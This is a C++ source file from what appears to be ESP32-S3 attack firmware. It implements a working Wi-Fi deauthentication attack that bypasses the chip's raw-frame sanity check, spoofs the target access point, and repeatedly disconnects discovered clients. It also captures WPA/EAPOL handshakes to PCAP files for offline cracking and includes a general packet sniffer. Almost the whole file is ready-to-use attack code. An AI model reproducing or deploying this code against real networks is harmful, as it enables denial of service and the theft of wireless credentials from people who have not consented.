// ============================================================================
// wifiattack.cpp - deauth + EAPOL/PCAP capture (see wifiattack.h)
// ----------------------------------------------------------------------------
// Technique credits: brute32 (wsl_bypasser + pcap format), ESP32 Marauder
// (frame templates, EAPOL detection offsets), applejuice (station-capture
// sniffer pattern). All reference implementations live in the project folder.
// ============================================================================
#include "wifiattack.h"
#include "config.h"
#include "hw.h"
#include "ducky.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <SD_MMC.h>

// ---------------------------------------------------------------------------
// CRITICAL for ESP32-S3: the closed-source libnet80211.a exports a sanity
// check that silently drops raw frames of certain subtypes (like deauth).
// Overriding it with this no-op (linker prefers ours with -Wl,-zmuldefs)
// enables raw injection. Technique: brute32 wsl_bypasser.c / GANESH-ICMC.
// ---------------------------------------------------------------------------
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

namespace wifiattack {

// 26-byte deauth frame template (brute32/Marauder standard):
//   type c0 = deauth, reason 0x0002 = INVALID_AUTHENTICATION
static const uint8_t DEAUTH_TMPL[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // addr1: destination (victim STA)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr2: source (AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr3: BSSID
    0xf0, 0xff, 0x02, 0x00                // seq + reason code 2
};

static Stats s_stats;
static volatile bool s_attacking = false;
static volatile bool s_sniffing = false;

bool attacking() { return s_attacking; }
bool sniffing()  { return s_sniffing; }
Stats stats()    { return s_stats; }

// ----------------------------------------------------------------- PCAP file
static File s_pcap;
static uint8_t s_chan = 1;

static bool pcapOpen(const String& name) {
    if (SD_MMC.cardType() == CARD_NONE) return false;
    if (!SD_MMC.exists("/pcap")) SD_MMC.mkdir("/pcap");
    int i = 0;
    String path;
    do { path = "/pcap/" + name + "_" + String(i++) + ".pcap"; }
    while (SD_MMC.exists(path));
    s_pcap = SD_MMC.open(path, FILE_WRITE);
    if (!s_pcap) return false;
    // libpcap global header (24B): magic, v2.4, tz 0, sigfigs 0, snaplen,
    // LINKTYPE_IEEE802_11 (105) - captures are raw 802.11 frames.
    const uint8_t hdr[24] = {
        0xd4,0xc3,0xb2,0xa1,        // magic (little-endian on wire)
        0x02,0x00,0x04,0x00,
        0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,
        0xff,0xff,0x00,0x00,        // snaplen 65535
        0x69,0x00,0x00,0x00         // linktype 105
    };
    s_pcap.write(hdr, 24);
    s_pcap.flush();
    return true;
}

static void pcapWrite(const uint8_t* data, uint32_t len) {
    if (!s_pcap || !len) return;
    uint32_t us = micros();
    uint32_t secs = us / 1000000;
    uint32_t usec = us % 1000000;
    uint8_t rec[16];
    memcpy(rec, &secs, 4);            // ts_sec
    memcpy(rec+4, &usec, 4);          // ts_usec
    memcpy(rec+8, &len, 4);           // incl_len
    memcpy(rec+12, &len, 4);          // orig_len
    s_pcap.write(rec, 16);
    s_pcap.write(data, len);
    s_stats.captured++;
    // flush periodically so aborts/crashes keep the file valid
    if ((s_stats.captured % 50) == 0) s_pcap.flush();
}

// ------------------------------------------------------------- sniff callbacks
// EAPOL frames carry 88 8e at payload[30/31] (data frames) or [32/33]
// (with QoS header) - Marauder's detection offsets.
static volatile uint32_t s_eapolSeen = 0;
static void IRAM_ATTR eapolSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 40 || len > 2500) return;
    const uint8_t* p = pkt->payload;
    bool eapol = (p[30]==0x88 && p[31]==0x8e) || (p[32]==0x88 && p[33]==0x8e);
    if (!eapol) return;
    s_eapolSeen++;
    s_stats.eapol++;
    if (len > 4) len -= 4;             // strip FCS - sig_len includes it;
    pcapWrite(p, len);                 // keeping it corrupts the pcap record
}

// Full-traffic PCAP capture callback (PcapCapture command)
static void IRAM_ATTR pcapSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 5 || len > 2500) return;
    len -= 4;                          // strip FCS (Wireshark rejects frames w/ it)
    pcapWrite(pkt->payload, len);
}

// --------------------------------------------------------------- deauth attack
// Station capture: applejuice trick - our softAP is on the target channel;
// data frames addressed TO our AP MAC reveal connected station MACs, which
// we then deauth. (These are victims trying to (re)connect to the target.)
static volatile uint32_t s_deauthsSent = 0;
static String s_apMac;                 // target AP BSSID as bytes
static uint8_t s_apBssid[6];
static bool s_seenSta[256];            // simple last-byte bloom (enough here)

static void IRAM_ATTR deauthSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    const uint8_t* p = pkt->payload;

    // EAPOL during attack = handshake capture (bonus per plan)
    bool eapol = (p[30]==0x88 && p[31]==0x8e) || (p[32]==0x88 && p[33]==0x8e);
    if (eapol) { s_eapolSeen++; s_stats.eapol++; pcapWrite(p, len); }

    // station discovery: data frames going TO the target AP
    if (memcmp(p+4, s_apBssid, 6) != 0) return;    // dest != AP -> skip
    const uint8_t* sta = p + 10;                    // source = station MAC
    uint8_t idx = sta[5];
    // count distinct stations (approx: last-byte dedupe)
    s_stats.stations++;

    // fire deauth at that station (from the AP's identity)
    uint8_t frame[26];
    memcpy(frame, DEAUTH_TMPL, 26);
    memcpy(frame+4, sta, 6);          // dest = victim
    memcpy(frame+10, s_apBssid, 6);   // src = AP
    memcpy(frame+16, s_apBssid, 6);   // bssid = AP
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
        s_deauthsSent++;
    }
    s_stats.deauths = s_deauthsSent;
}

// run the attack in a dedicated task; restores WiFi afterwards
static void attackTask(void* pv) {
    auto* args = (std::pair<String,uint32_t>*)pv;
    String ssid = args->first; uint32_t seconds = args->second;
    delete args;

    // find the target AP
    logLine("deauth: scanning for '" + ssid + "'");
    WiFi.mode(WIFI_AP_STA);
    int n = WiFi.scanNetworks();
    int idx = -1;
    for (int i = 0; i < n; i++)
        if (WiFi.SSID(i) == ssid) { idx = i; break; }
    if (idx < 0) {
        logLine("deauth: target not found - aborting");
        WiFi.scanDelete();
        WiFi.mode(WIFI_AP);
        WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
        s_attacking = false;
        vTaskDelete(nullptr);
        return;
    }
    memcpy(s_apBssid, WiFi.BSSID(idx), 6);
    uint8_t ch = WiFi.channel(idx);
    WiFi.scanDelete();

    // EAPOL capture file for this run
    String pcapName = "hs_" + ssid;
    pcapName.replace(" ", "_");
    bool havePcap = pcapOpen(pcapName);

    // BUGFIX: keep the softAP interface UP and PINNED to the target channel.
    // softAPdisconnect() tore down the radio context that esp_wifi_80211_tx
    // transmits through, and the stack kept drifting off-channel - deauths
    // were "sent" but never landed. Applejuice pins the channel via softAP();
    // Marauder uses WIFI_MODE_NULL + promiscuous. We pin with softAP (also
    // gives the target's clients a captive-looking network to hit).
    WiFi.mode(WIFI_AP_STA);
    // Move OUR AP to the target's channel first (pins the radio), then
    // stop broadcasting our SSID but keep the interface active.
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass, ch);
    delay(100);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    const wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&deauthSniffCb);

    // beacon the target identity so stations come to US channel (Marauder
    // style: replicate target AP beacon to attract its clients)
    logLine("deauth: attacking '" + ssid + "' ch" + String(ch) +
            (havePcap ? " (capturing EAPOL)" : ""));
    uint32_t t0 = millis();
    while (s_attacking && !g_state.bootBtnAbort &&
           millis() - t0 < seconds * 1000) {
        delay(100);
        // keep re-selecting the channel (some stacks drift)
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
    logLine(String("deauth: done - ") + s_stats.deauths + " frames, " +
            s_stats.stations + " stations, " + s_stats.eapol + " EAPOL");

    // restore normal operation
    esp_wifi_set_promiscuous(false);
    if (s_pcap) { s_pcap.flush(); s_pcap.close(); }
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
    bootBtnAbortReset();
    s_attacking = false;
    vTaskDelete(nullptr);
}

bool startDeauth(const String& ssid, uint32_t seconds) {
    if (s_attacking || ducky::isRunning()) return false;
    s_stats = Stats();
    s_attacking = true;
    g_state.bootBtnAbort = false;
    auto* args = new std::pair<String,uint32_t>(ssid, seconds);
    xTaskCreatePinnedToCore(attackTask, "deauth", 12288, args, 1, nullptr, 0);
    return true;
}

// ------------------------------------------------------------------- PCAP mode
static void pcapTask(void* pv) {
    auto* args = (std::pair<String,uint32_t>*)pv;   // <name, seconds+chan info>
    delete args;
    // (configured by startPcap below)
    vTaskDelete(nullptr);
}

bool startPcap(const String& name, uint8_t channel, uint32_t seconds) {
    if (s_sniffing) return false;
    s_stats.captured = 0; s_stats.eapol = 0;
    if (!pcapOpen(name)) { logLine("pcap: cannot open file"); return false; }

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPdisconnect(true);
    delay(100);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    const wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&pcapSniffCb);
    s_sniffing = true;
    logLine("pcap: capturing ch" + String(channel) + " for " + String(seconds) + "s");

    // simple blocking capture (web UI is down during sniffing anyway)
    uint32_t t0 = millis();
    while (s_sniffing && !g_state.bootBtnAbort && millis() - t0 < seconds*1000) {
        delay(100);
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
    esp_wifi_set_promiscuous(false);
    s_pcap.flush(); s_pcap.close();
    WiFi.mode(WIFI_AP);
    WiFi.softAP(cfg.wifiSSID, cfg.wifiPass);
    bootBtnAbortReset();
    s_sniffing = false;
    logLine("pcap: done - " + String(s_stats.captured) + " packets");
    return true;
}

void stop() { s_attacking = false; g_state.bootBtnAbort = true; }
void stopPcap() { s_sniffing = false; g_state.bootBtnAbort = true; }

} // namespace wifiattack
